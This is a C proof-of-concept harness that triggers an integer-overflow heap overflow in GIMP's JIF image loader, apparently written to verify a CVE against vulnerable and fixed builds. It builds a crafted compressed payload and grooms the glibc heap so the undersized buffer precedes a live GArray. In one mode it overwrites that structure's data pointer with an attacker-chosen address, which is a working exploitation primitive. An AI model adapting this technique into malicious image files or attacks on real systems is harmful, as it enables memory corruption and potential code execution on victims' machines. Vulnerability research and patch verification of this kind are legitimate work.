/* Real-consumer probe for CVE-2026-136329 (GIMP ReadJeffsImage JIF).
 *
 * The pinned function below is INCLUDED VERBATIM from ../pins/. Only the
 * surrounding consumer is supplied here: real glib 2.80 types/allocator and
 * real zlib 1.3 are linked; GimpImage, GError consumption and ReadOK are
 * thin stand-ins. No GIMP/GEGL plugin and no PDB file-load path is built.
 *
 * Heap experiment: allocate a 256-byte glib chunk, then a LIVE GString
 * immediately after it, free the first chunk (glibc tcache), then let the
 * pinned ReadJeffsImage() allocate `indexes` (data_size = 260) into that
 * freed chunk. Real zlib writes 324 bytes into a 264-byte usable chunk, so
 * the following live GString's fields must be overwritten with chosen
 * input bytes. Readback uses memcpy of the struct bytes so no corrupted
 * pointer is ever dereferenced.
 */
#define _GNU_SOURCE
#include <glib.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <malloc.h>
#include <zlib.h>

typedef void GimpImage;
#define _(s) (s)
static const char *g_error_msg = "";
#define read_error(msg, img, err) do { (void) (img); (void) (err); g_error_msg = (msg); } while (0)

typedef struct { guchar transparent; } GifColor;
static GifColor Gif89 = { 0x2a };

/* FILE*-based ReadOK() served from an in-memory chunked JIF stream. */
static guchar stream_bytes[4096];
static size_t stream_len = 0;
static size_t stream_pos = 0;

static gboolean
ReadOK (FILE *fd, void *buf, size_t n)
{
  (void) fd;
  if (stream_pos + n > stream_len)
    return FALSE;
  memcpy (buf, stream_bytes + stream_pos, n);
  stream_pos += n;
  return TRUE;
}

#ifdef VARIANT_FIXED
#include "../pins/jif-fixed.inc"
#else
#include "../pins/jif-vulnerable.inc"
#endif

static unsigned char payload_byte = 0x4d;
static unsigned char payload[512];
static int payload_custom = 0;

/* Build a JIF-style chunk stream whose zlib payload inflates to `outlen`
 * copies of the chosen payload byte (same construction as harness/driver.c). */
static void
build_stream (size_t outlen)
{
  guchar plain[4096];
  guchar zbuf[4096];
  uLongf zlen = sizeof zbuf;
  size_t i, off = 0;

  for (i = 0; i < outlen; i++)
    plain[i] = payload_custom ? payload[i] : payload_byte;
  if (compress2 (zbuf, &zlen, plain, (uLong) outlen, 9) != Z_OK)
    {
      fprintf (stderr, "compress2 failed\n");
      exit (2);
    }
  while (off < zlen)
    {
      size_t chunk = zlen - off;
      if (chunk > 255)
        chunk = 255;
      stream_bytes[stream_len++] = (guchar) chunk;
      memcpy (stream_bytes + stream_len, zbuf + off, chunk);
      stream_len += chunk;
      off += chunk;
    }
  stream_bytes[stream_len++] = 0;
  stream_pos = 0;
}

static void
hexdump (const unsigned char *p, size_t n)
{
  for (size_t i = 0; i < n; i++)
    printf ("%02x", p[i]);
  printf ("\n");
}

int
main (int argc, char **argv)
{
  setvbuf (stdout, NULL, _IONBF, 0);
  const char *mode = (argc > 1) ? argv[1] : "attack";
  guchar dest[8192];
  GimpImage *image = NULL;
  GError *error = NULL;
  gint len, height;
  gboolean alpha;
  size_t outlen, i, changed = 0;
  gboolean rc;

  if (argc > 2)
    payload_byte = (unsigned char) strtoul (argv[2], NULL, 16);

  if (! strcmp (mode, "safe"))
    {
      len = 4; height = 4; alpha = FALSE; outlen = 16;
    }
  else
    {
      /* len * height = 0x80000082; alpha doubling wraps data_size to 260
       * while zs.avail_out stays the unwrapped 0x80000082. */
      len = 2; height = 1073741889; alpha = TRUE; outlen = 324;
    }
  /* Optional chosen-address probe: put a valid pointer to a benign local
   * buffer at decompressed offset 272, which lands on the live GArray's
   * first field (data). No dereference of the overwritten field follows. */
  unsigned char benign[64];
  memcpy (benign, "BENIGN_MARKER", 14);
  if (! strcmp (mode, "ptr"))
    {
      void *chosen = (void *) benign;
      memset (payload, payload_byte, sizeof payload);
      memcpy (payload + 272, &chosen, sizeof chosen);
      payload_custom = 1;
      printf ("CHOSEN_PTR=%p PAYLOAD_OFFSET=272\n", chosen);
    }

  /* Groom the real glib/glibc heap: a freed 272-byte chunk immediately
   * followed by a live GLib container. GArray's control struct is
   * malloc-allocated (GString uses GSlice magazines). */
  unsigned char *groom = g_malloc (256);
  memset (groom, 0x5a, 256);
  printf ("LAYOUT groom=%p usable=%zu\n", (void *) groom,
          malloc_usable_size (groom));
  GArray *live = g_array_new (FALSE, FALSE, 1);
  unsigned char marker[128];
  memset (marker, 0x43, sizeof marker);
  g_array_append_vals (live, marker, sizeof marker);
  printf ("LAYOUT live_struct=%p live_data=%p delta=%td\n",
          (void *) live, (void *) live->data,
          (ptrdiff_t) ((char *) live - (char *) groom));
  unsigned char before[48], after[48];
  memcpy (before, live, sizeof before);

  g_free (groom);  /* tcache: pinned g_try_malloc(260) should reuse this */
  build_stream (outlen);
  rc = ReadJeffsImage (NULL, dest, 8, len, height, alpha, &image, &error);

  printf ("MODE=%s PAYLOAD=%02x RC=%d ERR=%s\n",
          mode, payload_byte, rc ? 1 : 0, g_error_msg);
  printf ("LIVE_BEFORE=");
  hexdump (before, sizeof before);
  memcpy (after, live, sizeof after);
  printf ("LIVE_AFTER=");
  hexdump (after, sizeof after);
  for (i = 0; i < sizeof after; i++)
    changed += (after[i] != before[i]);
  printf ("LIVE_CHANGED_BYTES=%zu\n", changed);
  if (! strcmp (mode, "ptr"))
    {
      void *got = NULL;
      memcpy (&got, after, sizeof got);
      printf ("PTR_FIELD=%p PTR_MATCH=%d\n", got, got == (void *) benign);
    }

  /* Never dereference live->data after a possible overwrite. */
  return 0;
}
